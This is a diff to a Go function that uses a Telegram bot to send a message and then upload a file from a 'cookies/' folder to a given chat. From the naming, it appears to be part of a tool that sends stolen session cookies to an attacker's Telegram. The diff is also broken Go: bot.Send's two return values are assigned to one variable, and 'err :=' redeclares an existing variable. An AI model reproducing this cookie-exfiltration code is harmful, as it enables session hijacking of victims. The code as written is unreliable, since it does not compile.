@@ -290,17 +290,16 @@ func send(text string, botT string, chat_id int64, tGcookie string) {
 		fmt.Printf("Error creating bot: %v", err)
 	}
 	// Set the bot to use debug mode (verbose logging).
-	bot.Debug = false
+	bot.Debug = true
 	// Send the message
 	msg := tgbotapi.NewMessage(chat_id, text)
-	bot.Send(msg)
+	err := bot.Send(msg)
 	if err != nil {
 		fmt.Printf("Error sending message: %v", err)
 	}
 	//Send the cookie attachment
 	docMsg :=  tgbotapi.NewDocumentUpload(chat_id, "cookies/"+tGcookie+".txt")
-	bot.Send(docMsg)
-
+	err := bot.Send(docMsg)
 	if err != nil {
 		fmt.Printf("Error sending cookie attachment: %v", err)
 	}
